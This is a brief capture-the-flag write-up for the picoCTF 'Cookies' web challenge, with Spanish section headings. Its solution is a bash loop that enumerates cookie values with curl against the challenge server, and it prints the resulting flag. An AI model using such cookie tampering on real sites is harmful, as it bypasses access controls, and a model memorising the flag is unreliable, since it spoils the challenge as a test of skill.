## Objetivo
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:27177/

## Datos de acceso

## Solución

ccajero-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep "pico"
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>

picoCTF{3v3ry1_l0v3s_c00k135_064663be}
## Notas adicionales

## Referencias
